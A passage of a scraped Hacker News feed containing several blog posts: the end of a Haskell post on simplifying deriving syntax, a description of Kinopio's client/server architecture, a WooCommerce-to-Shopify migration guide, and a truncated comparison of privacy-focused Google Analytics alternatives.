        <span>)</span>
    <span>)</span>
</code></pre></div></div>

<p>In this block, we define the <code>ToJSON</code> and <code>FromJSON</code> instances using the same <code>Generically</code> viatype.
We can still use <code>_</code> to refer to the type, since we know the type we’re deriving for: <code>Foo</code>.
This recovers the syntax convenience of “attached deriving.”</p>

<div><div><pre><code><span>newtype</span> <span>App</span> <span>a</span> <span>=</span> <span>App</span> <span>...</span>

<span>deriving</span> <span>App</span>
    <span>via</span> <span>_</span>
        <span>instance</span> 
            <span>(</span> <span>Functor</span>
            <span>,</span> <span>Applicative</span>
            <span>,</span> <span>Monad</span>
            <span>,</span> <span>MonadReader</span> <span>()</span>
            <span>,</span> <span>MonadError</span> <span>()</span>
            <span>,</span> <span>MonadState</span> <span>()</span>
            <span>)</span>
</code></pre></div></div>

<p>This also recovers the convenience of attached deriving.
Let’s look at the main <em>point</em> - GADTs.
Otherwise we could just remove <code>StandaloneDeriving</code> (with the nice benefit/tragedy of banning orphan derived instance).</p>

<div><div><pre><code><span>data</span> <span>Some</span> <span>f</span> <span>where</span>
    <span>Some</span> <span>::</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>f</span> <span>a</span> <span>-&gt;</span> <span>Some</span> <span>f</span>

<span>-- old</span>
<span>deriving</span> 
    <span>instance</span> <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>f</span> <span>a</span><span>))</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>Some</span> <span>f</span><span>)</span>

<span>-- new</span>
<span>deriving</span> <span>Some</span>
    <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>f</span> <span>a</span><span>))</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>_</span> <span>f</span><span>)</span>

<span>-- generally,</span>
<span>deriving</span> <span>SomeGadtType</span>
    <span>(</span><span>SomeContextOn</span> <span>a</span> <span>b</span> <span>c</span><span>)</span> <span>=&gt;</span>
        <span>(</span> <span>Show</span><span>,</span> <span>Eq</span><span>,</span> <span>ToJSON</span><span>,</span> <span>FromJSON</span>
        <span>)</span>
        <span>(</span><span>_</span> <span>a</span> <span>b</span> <span>c</span><span>)</span>
</code></pre></div></div>

<p>The <code>_</code> refers to the type name, without any variables applied.
So you need to apply the type variables in the instance head.
That’s a bit annoying, but maybe it’s fine</p>



<p>GHC provides a <code>newtype Stock a = Stock a</code> that hooks in to <code>DerivingVia</code> somehow.
Now we’re down to one deriving strategy.</p>

<div><div><pre><code><span>data</span> <span>X</span> <span>=</span> <span>X</span>

<span>deriving</span> <span>X</span>
    <span>via</span> <span>Stock</span> <span>_</span>
        <span>(</span> <span>Eq</span><span>,</span> <span>Show</span><span>,</span> <span>Generic</span> <span>)</span>
    <span>via</span> <span>Generically</span> <span>_</span>
        <span>(</span> <span>ToJSON</span><span>,</span> <span>FromJSON</span> <span>)</span>
</code></pre></div></div>

<p>This “deprivileges” the <code>Stock</code> deriving classes.</p>



<p>OK, so maybe you don’t like getting rid of attached deriving.
Let’s get rid of standalone deriving instead.
We need <code>StandaloneDeriving</code> for two reasons:</p>

<ol>
  <li>Orphan derived instances (shame on you)</li>
  <li>Specifying a context for GADTs and allow application of type variables</li>
</ol>

<div><div><pre><code><span>data</span> <span>Some</span> <span>f</span> <span>where</span>
    <span>Some</span> <span>::</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>f</span> <span>a</span> <span>-&gt;</span> <span>Some</span> <span>f</span>
    <span>deriving</span>
        <span>(</span> <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>f</span> <span>a</span><span>))</span>
            <span>=&gt;</span>
            <span>Show</span>
        <span>,</span> <span>-- generally,</span>
            <span>(</span><span>SomeContext</span> <span>f</span><span>)</span>
            <span>=&gt;</span>
            <span>SomeClass</span>
        <span>)</span>
</code></pre></div></div>

<p>The type variable <code>f</code> is in scope from the <code>data</code> declaration.</p>

<p>EDIT: <a href="https://twitter.com/quickdudley/status/1328068260659482624">@quickdudley</a> and <a href="https://twitter.com/nnotm/status/1327998875563683845">@nnotm</a> have correctly pointed out that you also want to be able to define instances of a class at the definition module of a class.
These are perfectly valid instances, and so we must keep <code>StandaloneDeriving</code>.</p>



<p>Alright, post is done.
These ideas are certainly controversial and Bad, but <em>man</em> wouldn’t it be nice to have a simpler story around deriving and type class instances?
The current story is so complex, and I think we can genuinely simplify Haskell-the-language by trimming some fat here.</p>

<p>EDIT: <a href="https://twitter.com/am_i_tom/status/1327992136151789568">@i_am_tom</a> posted a reference to the <a href="https://github.com/tysonzero/ghc-proposals/blob/concrete-class-dictionaries/proposals/0000-concrete-class-dictionaries.md">Concrete Class Dictionaries</a> GHC proposal, which subsumes a lot of this.</p>

</div></div>]]>
            </description>
            <link>https://www.parsonsmatt.org/2020/11/10/simplifying_deriving.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082793</guid>
            <pubDate>Fri, 13 Nov 2020 14:53:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Kinopio is Made (using state, localStorage, API, and WebSockets)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25082650">thread link</a>) | @pketh
<br/>
November 13, 2020 | https://pketh.org/how-kinopio-is-made.html | <a href="https://web.archive.org/web/*/https://pketh.org/how-kinopio-is-made.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>You’ve probably heard, or lived, a story that goes like this…</p>

<blockquote>
  <p>I’m tired of <a href="https://pketh.org/why-software-is-slow-and-shitty.html">technology</a>. I’m leaving to do something <em>real</em> like sculpt clay, work wood, herd sheep, and grow vegetables.</p>
</blockquote>

<p>But making software that runs fast, efficiently, and reliably is it’s own kind of  craft, tangible in its own way. But, to do any kind of craft you have to understand the materials of your medium, how they bend, and how to work together.</p>

<p>Making an aircraft engine requires an understanding of the tolerances and capabilities of different metals, airflow and combustion. Not that I know anything about all that – our engine is made of state, localStorage, API, and websockets.</p>

<p><img src="https://pketh.org/images/2020/porco-rosso-engine.jpg"></p>
<figure>
  <figcaption>
    Porco Rosso
  </figcaption>
</figure>



<ul>
  <li><code>kinopio-client</code> is a Vue.js app that weighs 150 KB. When you go to <a href="https://kinopio.club/">https://kinopio.club</a>, it’s downloaded and run in your browser. This is the only part of Kinopio you use if you don’t have an account.</li>
  <li><code>kinopio-server</code> is a Node.js app that runs on a server out in the world. If you’re signed in, it saves your data to a database so that you can share, collaborate, and access your spaces on other devices.</li>
</ul>

<p><img src="https://pketh.org/images/2020/architecture.png"></p>
<figure>
  <figcaption>
<a href="https://kinopio.club/kinopio-architecture-and-costs-JOGXFJ0FEMpS3crbh6U9k">Kinopio Architecture and Costs</a> shows the complete system
  </figcaption>
</figure>



<p><img src="https://pketh.org/images/2020/desktop-computer.gif"></p>

<ul>
  <li>Speed first, perfect later. You shouldn’t need to wait for server requests to complete before editing your spaces. Because <a href="https://craigmod.com/essays/fast_software/">fast software is the best software</a>.</li>
  <li>Favor easy maintenance. To help you sleep at night choose open technologies that are widely supported and well documented.</li>
  <li>Building a foundation for decades. This mindset encourages me to write small, simple code that is easy to re-read in the future. If I’m adding a third-party library to Kinopio, that’s now a commitment over years so I’m motivated to really know what I’m adding – and maybe write it myself instead if that’s the smaller and faster option.</li>
</ul>



<h2 id="state">State</h2>

<p><strong>State</strong> is your current space and user data, which informs the display of elements on the page. E.g. my <code>user.name = 'Pirijan'</code> and my <code>user.color = 'cyan'</code>. Kinopio uses Vue.js/Vuex to bind data to elements on the page. So when you change your <code>user.color</code>, everything that references that user’s color updates.</p>


<figure>
  <figcaption>
Data-binding makes apps feel alive and organic
  </figcaption>
</figure>

<p>State is not persistent though, unless it’s saved somewhere it’ll be lost the next time you refresh.</p>

<h2 id="localstorage">LocalStorage</h2>

<p><strong>LocalStorage</strong> is 2-5 MBs of key-value data that every website gets to save on your device. Unlike cookies, localStorage data can only be accessed by the URL that created it which means it’s secure and can’t be used for user tracking and other shady shit.</p>

<p>Here’s a secret, by stringifying JSON objects you can save any kind of data structure to it. LocalStorage is fragile though, you can accidentally wipe it out by clearing your browser cache.</p>

<h2 id="api-and-database">API and Database</h2>

<p>The Kinopio <strong>API</strong> is used to <code>GET</code> and <code>POST</code>(save) data to the database so that you can edit your spaces on other devices. Getting data from servers is much slower than getting data from your localStorage, because of the round-trip and because every request needs to be privacy authorized.</p>

<p><img src="https://pketh.org/images/2020/api-docs.png"></p>
<figure>
  <figcaption>
<a href="https://help.kinopio.club/api">Kinopio API Docs</a> are  also public so that developers can make custom integrations and tools
  </figcaption>
</figure>

<h2 id="websockets">Websockets</h2>

<p><strong>Websockets</strong> create that magical collaboration feeling by enabling a real-time stream of messages to be sent and received by a client, e.g. <code>Pirijan moved cardId ABC123 to position {x: 100, y: 200}</code>. These messages are relayed by the server to collaborators whose space state is updated. e.g. updating the position of the card.</p>

<p>Websocket connections must be actively kept alive with a ‘heartbeat’ exchange. If you go afk for a while, like to make a coffee or something, reconnecting to the stream takes a couple seconds.</p>



<p><img src="https://pketh.org/images/2020/assembly.png"></p>
<figure>
  <figcaption>
<a href="https://www.are.na/block/3753956">(Source)</a>
  </figcaption>
</figure>

<table>
  <tbody>
    <tr>
      <td><strong>Technology</strong></td>
      <td><strong>Speed</strong></td>
      <td><strong>Persistent</strong></td>
      <td><strong>Uses Server</strong></td>
    </tr>
    <tr>
      <td>State</td>
      <td>Instant</td>
      <td>No</td>
      <td>No</td>
    </tr>
    <tr>
      <td>LocalStorage</td>
      <td>Instant</td>
      <td>Yes</td>
      <td>No</td>
    </tr>
    <tr>
      <td>API and Database</td>
      <td>Slow</td>
      <td>Yes</td>
      <td>Yes</td>
    </tr>
    <tr>
      <td>Websockets</td>
      <td>Fast, slow to connect</td>
      <td>No</td>
      <td>Yes</td>
    </tr>
  </tbody>
</table>

<p>When you load Kinopio for the first time, your state is created and saved to localStorage so it can be restored. When you update your state by editing cards or connections, localStorage is also updated. Once you sign up, updates also save to the API.</p>

<p>Once you start using Kinopio on other devices, the localStorage on your phone might be ahead of the one on your computer.</p>

<p>To be fast, Kinopio first restores state from possibly outdated localStorage. Once the latest server data is downloaded, the state is re-restored.</p>

<p>While the space is downloading from the server, edits you make are saved and then applied on top of the server copy.</p>

<p><img src="https://pketh.org/images/2020/loading-space.png"></p>
<figure>
  <figcaption>
  Edits you make to your space while the server data is downloading are recorded and applied to it
  </figcaption>
</figure>

<p>Websockets only stream relayed updates to connected collaborators and spectators. You might be wondering, why don’t you just update the database with websockets instead of relatively slow API requests?</p>

<p>The problem with saving data with websockets is that they’re <em>too</em> fast. Authenticating that many messages per second and writing them to disk would be really inefficient. E.g. If you’re moving a card from position <code>x: 20</code> to <code>x: 420</code>, Kinopio will use websockets to broadcast many updates during the move: <code>moving card x to 21</code>, <code>moving card x to 24</code>, <code>moving card x to 28</code>… potentially hundreds of messages. Or you could send a single API request after you’ve moved the card, <code>PATCH card.x = 420</code>.</p>

<p><img src="https://pketh.org/images/2020/cappuccino.png"></p>

<p>Building fast, easy to maintain software that’ll hopefully last for decades means understanding and using the right technology for the right job. It’s its own kind of craft, in its own kind of way.</p>

  </div><div>
    <p>
      
        Discuss on <a href="https://news.ycombinator.com/item?id=25082650">Hacker News</a>,
        <br>
      
      Reply to <a href="mailto:hi@pirijan.com?subject=regarding%20How%20Kinopio%20is%20Made">hi@pirijan.com</a>,
      <br>Subscribe to the <a href="https://pketh.org/feed.xml">RSS feed</a>,
      <br>or follow me on Twitter <a href="https://twitter.com/pketh">@pketh</a>.
    </p>
    <p>
        If you liked this, you might also enjoy
        
          
        
          
        
          
        
    </p>
  </div></div>]]>
            </description>
            <link>https://pketh.org/how-kinopio-is-made.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082650</guid>
            <pubDate>Fri, 13 Nov 2020 14:42:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do I migrate WooCommerce to Shopify?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25082532">thread link</a>) | @iliashad
<br/>
November 13, 2020 | https://iliashaddad.com/blog/how-do-i-migrate-woocommerce-to-shopify | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-do-i-migrate-woocommerce-to-shopify">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <a href="https://iliashaddad.com/static/f0a314f7ee878b2fe945731db8cacaf5/cc0ea/how-do-i-migrate-woocommerce-to-shopify-0.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="how do i migrate woocommerce to shopify 0" title="how do i migrate woocommerce to shopify 0" src="https://iliashaddad.com/static/f0a314f7ee878b2fe945731db8cacaf5/1263b/how-do-i-migrate-woocommerce-to-shopify-0.png" srcset="https://iliashaddad.com/static/f0a314f7ee878b2fe945731db8cacaf5/86700/how-do-i-migrate-woocommerce-to-shopify-0.png 250w,https://iliashaddad.com/static/f0a314f7ee878b2fe945731db8cacaf5/0eb09/how-do-i-migrate-woocommerce-to-shopify-0.png 500w,https://iliashaddad.com/static/f0a314f7ee878b2fe945731db8cacaf5/1263b/how-do-i-migrate-woocommerce-to-shopify-0.png 1000w,https://iliashaddad.com/static/f0a314f7ee878b2fe945731db8cacaf5/cc0ea/how-do-i-migrate-woocommerce-to-shopify-0.png 1368w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><p>Yesterday, I watch the webinar from Shopify Partners which explains how you can migrate your Woo-commerce Store Data to Shopify easy and with Shopify Official App and I’m very surprised that Shopify has their own Woocommerce Migration App but not listed in Shopify App Marketplace</p><h3>Step 1: Install the Shopify Migration Tool</h3><p>Visit <a href="http://import-store.shopifyapps.com/">this link</a> and paste your Shopify Store Link</p><p><span>
      <a href="https://iliashaddad.com/static/09337bfb4cd174c12952dcf702936642/78d47/1__mLNZEyz3vc4qg20SW5KYsA.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Shopify Migration Tool Installation" title="Shopify Migration Tool Installation" src="https://iliashaddad.com/static/09337bfb4cd174c12952dcf702936642/78d47/1__mLNZEyz3vc4qg20SW5KYsA.png" srcset="https://iliashaddad.com/static/09337bfb4cd174c12952dcf702936642/86700/1__mLNZEyz3vc4qg20SW5KYsA.png 250w,https://iliashaddad.com/static/09337bfb4cd174c12952dcf702936642/0eb09/1__mLNZEyz3vc4qg20SW5KYsA.png 500w,https://iliashaddad.com/static/09337bfb4cd174c12952dcf702936642/78d47/1__mLNZEyz3vc4qg20SW5KYsA.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span>
Shopify Migration Tool Installation</p><p>and after that, you need to give the tool permissions to import products</p><p><span>
      <a href="https://iliashaddad.com/static/f08c3da469a1289e520915500f953906/78d47/1______SAUVS8UTdTKjO__hJKWdQ.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Shopify Migration Tool Permission" title="Shopify Migration Tool Permission" src="https://iliashaddad.com/static/f08c3da469a1289e520915500f953906/78d47/1______SAUVS8UTdTKjO__hJKWdQ.png" srcset="https://iliashaddad.com/static/f08c3da469a1289e520915500f953906/86700/1______SAUVS8UTdTKjO__hJKWdQ.png 250w,https://iliashaddad.com/static/f08c3da469a1289e520915500f953906/0eb09/1______SAUVS8UTdTKjO__hJKWdQ.png 500w,https://iliashaddad.com/static/f08c3da469a1289e520915500f953906/78d47/1______SAUVS8UTdTKjO__hJKWdQ.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span>
Shopify Migration Tool Permission</p><h3>Step 2: Choose Woocommerce as a&nbsp;platform</h3><p>Select Woocommerce from Drop-down Menu</p><p><span>
      <a href="https://iliashaddad.com/static/38eeab43f34a1dab4579ff65c7980f76/78d47/1__fAHB7Ymg9YSQQFCggLnTYw.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="1  fAHB7Ymg9YSQQFCggLnTYw" title="1  fAHB7Ymg9YSQQFCggLnTYw" src="https://iliashaddad.com/static/38eeab43f34a1dab4579ff65c7980f76/78d47/1__fAHB7Ymg9YSQQFCggLnTYw.png" srcset="https://iliashaddad.com/static/38eeab43f34a1dab4579ff65c7980f76/86700/1__fAHB7Ymg9YSQQFCggLnTYw.png 250w,https://iliashaddad.com/static/38eeab43f34a1dab4579ff65c7980f76/0eb09/1__fAHB7Ymg9YSQQFCggLnTYw.png 500w,https://iliashaddad.com/static/38eeab43f34a1dab4579ff65c7980f76/78d47/1__fAHB7Ymg9YSQQFCggLnTYw.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><h3>Step 3: Export Your WooCommerce Store&nbsp;Data</h3><p>Go to <strong>Wordpress Admin Dashboard &gt; Tools &gt; Export</strong> and Select All Content and click on download export file</p><p><span>
      <a href="https://iliashaddad.com/static/90b9cdaf857784522675ca6f23787506/78d47/1__tPOEH5bUfotWyED31__IC6A.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Export Your WooCommerce Store&nbsp;Data" title="Export Your WooCommerce Store&nbsp;Data" src="https://iliashaddad.com/static/90b9cdaf857784522675ca6f23787506/78d47/1__tPOEH5bUfotWyED31__IC6A.png" srcset="https://iliashaddad.com/static/90b9cdaf857784522675ca6f23787506/86700/1__tPOEH5bUfotWyED31__IC6A.png 250w,https://iliashaddad.com/static/90b9cdaf857784522675ca6f23787506/0eb09/1__tPOEH5bUfotWyED31__IC6A.png 500w,https://iliashaddad.com/static/90b9cdaf857784522675ca6f23787506/78d47/1__tPOEH5bUfotWyED31__IC6A.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span>
Export Your WooCommerce Store&nbsp;Data</p><h3>Step 4: Import Exported Data to Shopify Migration Tool</h3><p><span>
      <a href="https://iliashaddad.com/static/a6b57039a3df7de12f63a1a66d770c7a/78d47/1__b__vHQGExj9InQfKJmaAkow.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="1  b  vHQGExj9InQfKJmaAkow" title="1  b  vHQGExj9InQfKJmaAkow" src="https://iliashaddad.com/static/a6b57039a3df7de12f63a1a66d770c7a/78d47/1__b__vHQGExj9InQfKJmaAkow.png" srcset="https://iliashaddad.com/static/a6b57039a3df7de12f63a1a66d770c7a/86700/1__b__vHQGExj9InQfKJmaAkow.png 250w,https://iliashaddad.com/static/a6b57039a3df7de12f63a1a66d770c7a/0eb09/1__b__vHQGExj9InQfKJmaAkow.png 500w,https://iliashaddad.com/static/a6b57039a3df7de12f63a1a66d770c7a/78d47/1__b__vHQGExj9InQfKJmaAkow.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><p>Click on Add file and select XML Exported file and it’s will start extracting data founded in the XML file</p><p><span>
      <a href="https://iliashaddad.com/static/93f48f85dbb56a5022fc1630d677bc19/78d47/1__ab08nqCCqS0BvA93i2DJRg.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="1  ab08nqCCqS0BvA93i2DJRg" title="1  ab08nqCCqS0BvA93i2DJRg" src="https://iliashaddad.com/static/93f48f85dbb56a5022fc1630d677bc19/78d47/1__ab08nqCCqS0BvA93i2DJRg.png" srcset="https://iliashaddad.com/static/93f48f85dbb56a5022fc1630d677bc19/86700/1__ab08nqCCqS0BvA93i2DJRg.png 250w,https://iliashaddad.com/static/93f48f85dbb56a5022fc1630d677bc19/0eb09/1__ab08nqCCqS0BvA93i2DJRg.png 500w,https://iliashaddad.com/static/93f48f85dbb56a5022fc1630d677bc19/78d47/1__ab08nqCCqS0BvA93i2DJRg.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><p>After extracting data and it’s will show the number of products and collection founded in XML file and you deselect “Include Inventory” if you don’t want to import products inventory and after that click on import button</p><p><span>
      <a href="https://iliashaddad.com/static/0fbe05f424faa79c016ee602dfde954e/78d47/1____nNvzEIMhtvvF__03EIFgjw.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="1    nNvzEIMhtvvF  03EIFgjw" title="1    nNvzEIMhtvvF  03EIFgjw" src="https://iliashaddad.com/static/0fbe05f424faa79c016ee602dfde954e/78d47/1____nNvzEIMhtvvF__03EIFgjw.png" srcset="https://iliashaddad.com/static/0fbe05f424faa79c016ee602dfde954e/86700/1____nNvzEIMhtvvF__03EIFgjw.png 250w,https://iliashaddad.com/static/0fbe05f424faa79c016ee602dfde954e/0eb09/1____nNvzEIMhtvvF__03EIFgjw.png 500w,https://iliashaddad.com/static/0fbe05f424faa79c016ee602dfde954e/78d47/1____nNvzEIMhtvvF__03EIFgjw.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><p>You can leave the App import data and maybe will take a few hours to import it depends on the number of products and variations and once the importation is complete you’ll receive an email and you’ll have some failed importations</p><p><span>
      <a href="https://iliashaddad.com/static/a2ed10deaf76a6d23a150899e97eb40f/78d47/1__yz9UYfSjTCAeGy5ffBy02g.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="1  yz9UYfSjTCAeGy5ffBy02g" title="1  yz9UYfSjTCAeGy5ffBy02g" src="https://iliashaddad.com/static/a2ed10deaf76a6d23a150899e97eb40f/78d47/1__yz9UYfSjTCAeGy5ffBy02g.png" srcset="https://iliashaddad.com/static/a2ed10deaf76a6d23a150899e97eb40f/86700/1__yz9UYfSjTCAeGy5ffBy02g.png 250w,https://iliashaddad.com/static/a2ed10deaf76a6d23a150899e97eb40f/0eb09/1__yz9UYfSjTCAeGy5ffBy02g.png 500w,https://iliashaddad.com/static/a2ed10deaf76a6d23a150899e97eb40f/78d47/1__yz9UYfSjTCAeGy5ffBy02g.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><h3>References</h3><ul><li>Migrating Clients from WooCommerce to Shopify: Why and How to Make the Move — <a href="https://www.youtube.com/watch?v=zv3HgyaZ0-4">Youtube</a></li></ul><p>Have a nice day!</p><p>Ilias</p><p>My Social Links:</p><ul><li><p><a href="https://twitter.com/IliasHaddad3">Twitter</a></p></li><li><p><a href="https://www.linkedin.com/in/ilias-haddad/">Linkedin</a></p></li></ul></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-do-i-migrate-woocommerce-to-shopify</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082532</guid>
            <pubDate>Fri, 13 Nov 2020 14:34:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Analytics alternatives that care about your privacy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25082460">thread link</a>) | @phiilu
<br/>
November 13, 2020 | https://phiilu.com/here-are-6-google-analytics-alternatives-that-care-about-your-privacy | <a href="https://web.archive.org/web/*/https://phiilu.com/here-are-6-google-analytics-alternatives-that-care-about-your-privacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I tried out many analytics SaaS on my blog to find a great alternative for my tracking needs. I was using Google Analytics before, but now I want to use something that cares about my and other user's privacy.</p><p>My feature requests are very simple:</p><ul><li>tracks page views without using cookies</li><li>privacy-focused</li><li>can track events</li><li>offers a way to use a custom domain to deny ad blockers</li><li>(optional) possibility to share the dashboard via a link</li></ul><p>Most alternatives I found offer (most of) those features and even more. Before going over each alternative, I want to talk about why you might want to get rid of Google Analytics.</p><h2>Why you should not use Google Analytics</h2><p><strong>Privacy.</strong> Google Analytics is a free service from Google. When something is free, you probably will be paying with something else. In Google's case, you will be paying with the data that you collect for them. Google is a big ad company that generates money by using your data. So this is one big reason not to use Google Analytics. I try to reduce my services that depend on Google and I always look for alternatives. <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/levelsio">Pieter Levels</a> created a website where you can find alternatives for Google services called <a target="_blank" rel="noopener noreferrer" href="https://nomoregoogle.com/">No More Google</a>.</p><p><strong>Cookies.</strong> Another reason why you might not want to use Google Analytics is that you will have to show those ugly cookie banners. If you are using services that put cookies on your site you will have to show those cookie banners to stay GDPR compliant. You will also have to put in place the option to opt-out of it and have a policy page. It's not that difficult to implement, but you could skip it.</p><p><strong>Complex Dashboard.</strong> Google Analytics is way more than just tracking pageviews, therefore it has lots of features and the dashboard is not that easy to use. If you only want to track page views and maybe some events then I think Google Analytics is overkill for your use case.</p><p><strong>Ad-Blockers.</strong> If you use Google Analytics you will not track all page views, because of the well-known domain name that it is blocked by most ad blockers. With other services, you can use a custom domain that is not blocked by ad blockers and you will get way more analytics data.</p><hr><p>In the next sections, I want to give you an overview of 6 different analytics services that I can recommend without blinking an eye. Some of them are free to use and open-source, others will require a subscription.</p><h2>Plausible Analytics</h2><p><a target="_blank" rel="noopener noreferrer" href="https://plausible.io/">https://plausible.io/</a></p><blockquote><p>Simple and privacy-friendly alternative to Google Analytics</p></blockquote><p>Plausible Analytics is one of my favorite Analytics services I have used.</p><p>The UI is very modern and clean, it is privacy-friendly, can track multiple websites in one account, you can <a target="_blank" rel="noopener noreferrer" href="https://docs.plausible.io/self-hosting/">self-host</a> it because it is <a target="_blank" rel="noopener noreferrer" href="https://github.com/plausible/analytics">open source</a>, it allows the use of custom domains, sends you weekly or monthly reports and much more.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/tClWlK2Wk8YxnZzelQq3l/dad4d975b556a1702daa15e0c7ff0c82/Screenshot_2020-11-04_at_21.10.14.png" alt="Plausible Analytics 7-days"></p><p>It ticks almost every checkbox of the features I need and if it is not currently implemented it will be soon. Plausible Analytics is working on more features and they have a <a target="_blank" rel="noopener noreferrer" href="https://github.com/plausible/analytics/projects/1">public roadmap</a> where you can see what will be added next!</p><p>I like to host services myself therefore I love that Plausible is open source and that I can host it myself. Of course, with self-hosting, I need to take care that the server is always online and the database is backed up regularly.</p><p>If I don't want to do that, I can let Plausible take care of it for a very fair price depending on the amount of traffic you have. They even offer a free trial of 30 days without requiring a credit card.</p><h2>Fathom</h2><p><a target="_blank" rel="noopener noreferrer" href="https://usefathom.com/ref/SAJGHU">https://usefathom.com/</a> (affiliate link)</p><blockquote><p>Your website analytics should be simple, fast and privacy-focused</p></blockquote><p>Fathom is one of the first analytics SaaS that focused on privacy.</p><p>It offers a clean and easy to use dashboard with only the information that you will need. You can use your Fathom account for multiple websites, the pricing is fair, you can use custom domains and you can track events by creating goals.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/7EEZoLbMU6NmsGnoJvykT8/81839ba5790494c6a95a1c5d4cd7d056/Screenshot_2020-11-04_at_21.08.19.png" alt="Fathom 7-days"></p><p>They are currently working on new branding and <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/usefathom/status/1319310149647937536">as it looks like</a> a new dashboard with additional features like API access.</p><p>Additional to analytics Fathom also provides website monitoring. You can get notified if your website ever goes offline and that is included with your account for FREE!</p><p>Recently Fathom published the <a target="_blank" rel="noopener noreferrer" href="https://usephantom.com/">Phantom Analyzer</a>. A simple tool where you can check if a site is using some shady trackers or if your site is trackers free.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/1bE9MaSnfSxFWH7iuJYcj2/73d40052d493ad36b741bb10b059de96/Screenshot_2020-11-04_at_21.48.43.png" alt="Phantom Analyzer"></p><p>If you care about privacy then I would suggest that you check out Fathom. They offer 7 days free trial and if you decide to delete your account, they make sure that your data is gone for good!</p><h2>Umami</h2><p><a target="_blank" rel="noopener noreferrer" href="https://umami.is/">https://umami.is/</a></p><blockquote><p>own your website analytics</p></blockquote><p>Umami is an open-source alternative to Google Analytics developed by <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/caozilla">Mike Cao</a> that you can host yourself.</p><p>Umami offers simple page and event tracking with a beautiful minimalistic UI. You can add as many websites as you like. Create a shareable link for the analytics and see real-time visitors.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/6m0v9HixM56yBOeWhgSP9P/5eef4d612538564bc4e7bf7ccd7288ae/Screenshot_2020-11-04_at_21.10.39.png" alt="Umami 7-days"></p><p>I like how simple and clean the dashboard from Umami is.  New features and improvements are added regularly. Hosting is very easy too and documented well!</p><p>Hosting the analytics service yourself will allow you full control of the data that is tracked of your visitors. As I already said if tracking data is critical for you, you should probably invest some time into setting up some backup strategies. Therefore Umami is "free", but you will have to pay with your own time and stress I guess 😅</p><h2>Simple Analytics</h2><p><a target="_blank" rel="noopener noreferrer" href="https://referral.simpleanalytics.com/phiilu">https://simpleanalytics.com/</a> (affiliate link)</p><blockquote><p>Simple, clean, and friendly analytics</p></blockquote><p>I found Simple Analytics via Twitter and thought I might check it out too.</p><p>Simple Analytics offers privacy-friendly analytics that won't sell your data. It has a strong focus on being privacy-friendly and <a target="_blank" rel="noopener noreferrer" href="https://docs.simpleanalytics.com/what-we-collect?ref=simpleanalytics.com">transparent</a> with what it will track and store.
